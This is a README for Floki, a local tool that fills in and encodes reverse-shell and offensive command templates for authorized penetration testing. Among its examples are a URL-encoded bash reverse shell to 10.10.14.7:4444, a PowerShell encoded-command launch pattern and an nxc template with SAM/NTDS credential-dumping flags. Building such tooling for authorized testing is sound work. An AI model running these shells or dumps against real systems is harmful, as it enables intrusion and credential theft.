# Floki

Local reverse-shell / command payload templating utility for **authorized**
penetration-testing engagements. Pick a template, fill in LHOST/LPORT/RHOST/SHELL,
and Floki renders the ready-to-run command — encoded for its target context
(raw shell, URL-encoded for a web param, or base64 for PowerShell `-EncodedCommand`).

Floki only **assembles and formats text you curate** in `templates.json`. It never
executes a payload, never targets a host, and makes no outbound network calls. The
only thing that touches the network during use is your own listener.

## Run

Python 3.7+ standard library only — no `pip install`, no dependencies.

```bash
python3 server.py            # http://127.0.0.1:8000
python3 server.py 9001       # custom port
```

Open the printed URL. Bound to `127.0.0.1` only.

## Use

1. Start your listener first, e.g. `nc -lvnp 4444`.
2. **Navigator** (left): pick a template. **Builder** (center): fill its fields, optionally
   toggle **flags** and add **extra args**, then **Render** → **Copy**.
3. **Dock** (right): a **Reference** tab (click any row to copy) and a **Methodology** tab
   (an interactive checklist + a "what you have" scratchpad, saved in your browser).

### PowerShell base64

The `powershell` template has `"encoding": "base64"`, so the output is UTF-16LE
base64. Run it on target as:

```powershell
powershell -e <rendered-output>
```

### URL-encoded web-param example

The `bash-url` template percent-encodes the whole payload for a URL/POST parameter:

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.7%2F4444%200%3E%261%27
```

## What's inside

**154 starter templates** in a two-level **group → category** structure, browsable
in a collapsible, searchable sidebar. Groups: **Reverse Shells · Listeners & Upgrade ·
Enumeration · Web Attacks · Brute Force · Active Directory · Databases · Privilege
Escalation · File Transfer · Pivoting & Tunneling · Cracking · NetExec (nxc)**. OSCP-
oriented and grounded in public references (0xsyr0/OSCP, netexec.wiki,
PayloadsAllTheThings) plus curated notes; edit or add your own.

The **NetExec (nxc)** group is comprehensive — SMB / LDAP / WinRM / MSSQL / SSH / FTP /
RDP / WMI / NFS / VNC — with credential dumping, command execution, spidering, roasting,
BloodHound, and modules. Type in the **filter** box to search every template.

### Flags & extra args

Most tool commands (nmap, gobuster, ffuf, wfuzz, hydra, sqlmap, wpscan, hashcat, john,
smbmap, impacket, evil-winrm, nxc, …) expose **toggleable flags** as chips — check the
ones you want (`-Pn`, `--script vuln`, `-x php,txt,html`, `--sam`, `--dump`, …) and
they're appended. Only flags the template declares are honored. The **Extra args** box
appends anything else verbatim, so every command is composable — including flagless
one-liners and reverse shells.

Define flags on a template with an `"options"` array of flag strings:

```json
{ "id": "nxc-smb-enum", "group": "NetExec (nxc)", "category": "SMB",
  "name": "nxc smb — enumerate", "type": "nxc", "encoding": "raw",
  "template": "nxc smb {TARGET} -u {USER} -p {PASS}",
  "options": ["--shares", "--users", "--groups", "--sam", "--ntds"] }
```

### Reference panel

A searchable **Reference** panel (backed by the sqlite DB) holds quick-lookup data:
**ports/services**, **default credentials**, **hashcat modes**, **GTFOBins** privesc
one-liners, **wordlist paths**, and **NetExec modules** (`-M` names by protocol). Click
any row to copy its key value (a module copies as `-M <name>`).

### Globals

The **Globals** panel at the top of the Builder lets you set common variables once —
`LHOST`, `LPORT`, `DOMAIN`, `DC_IP`, `USER`, `PASS`, `TARGET`, `WORDLIST`, `HASH`,
`IFACE`. Every template you select prefills its matching fields from these (you can still
override per-render). Saved in your browser (localStorage), never on the server.

## Data store

Floki's runtime store is `floki.db` (sqlite, stdlib — still no dependencies). It is
**rebuilt on every startup** from two editable seed files, so you edit text and restart:

- `templates.json` — the payload/command templates (→ `templates` table).
- `reference_seed.json` — the reference tables (`ports`, `creds`, `hashmodes`,
  `gtfobins`, `wordlists`, `modules`). Add rows, or add a whole new array + a matching
  entry in `REF_TABLES` in `server.py`, to fit more data.
- `methodology.json` — phases and checklist items for the Methodology tab (served as-is).

`floki.db` is git-ignored (it's generated); commit the seed files. The methodology
checklist state and the "what you have" scratchpad live in your browser (localStorage),
never on the server.

## Add / edit templates

Edit `templates.json` — a list of objects:

```json
{
  "id": "unique-id",
  "name": "Human label",
  "category": "AD · Kerberos",
  "type": "impacket",
  "encoding": "raw",
  "template": "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP} -request",
  "notes": "Anything worth remembering."
}
```

- **Placeholders:** use **any** `{UPPER_CASE}` token — the UI auto-generates a field
  for each one the template contains. Common vars: `{LHOST} {LPORT} {RHOST} {SHELL}`
  (shells), `{DOMAIN} {DC_IP} {USER} {PASS} {HASH} {TARGET} {WORDLIST}` (AD), and
  `{RPORT} {URL} {FILE} {IFACE}` (web / transfer / pivoting).
- **group** + **category:** two-level sidebar grouping (templates render in file order).
- **encoding:** `raw` (or `none`) = as-is · `url` = percent-encode whole command ·
  `base64` = UTF-16LE base64 (PowerShell `-EncodedCommand`).

- **options:** optional `["--flag", …]` array of toggleable flags (see *Flags & extra args*).

Validation on render: `LHOST` / `RHOST` / `DC_IP` must be a valid IP or hostname;
`LPORT` / `RPORT` must be 1–65535; every other var is required but free-text (`SHELL`
defaults to `/bin/bash`, `TARGET` stays free so it accepts hosts, URLs, or CIDRs).
Bad or missing input fails with a clear message and nothing renders.

## Files

| File | Purpose |
|------|---------|
| `server.py` | stdlib HTTP server: validation, substitution, flag/encoding, sqlite build/search |
| `templates.json` | editable payload/command library seed (154 starters) |
| `reference_seed.json` | editable reference-data seed (ports, creds, hashmodes, gtfobins, wordlists) |
| `methodology.json` | editable phases/items for the Methodology checklist |
| `floki.db` | sqlite runtime store, rebuilt from the seeds on startup (git-ignored) |
| `index.html` | single-page UI (navigator · builder · reference/methodology dock) |
| `test_floki.py` | `python3 test_floki.py` — engine + DB self-check |

## Notes

- For use only against systems you are explicitly authorized to test.
- Payload syntax is standard, publicly documented one-liners; curate your own in `templates.json`.
- `floki.db` and any local `reference/` notes are git-ignored — keep engagement data out of the repo.
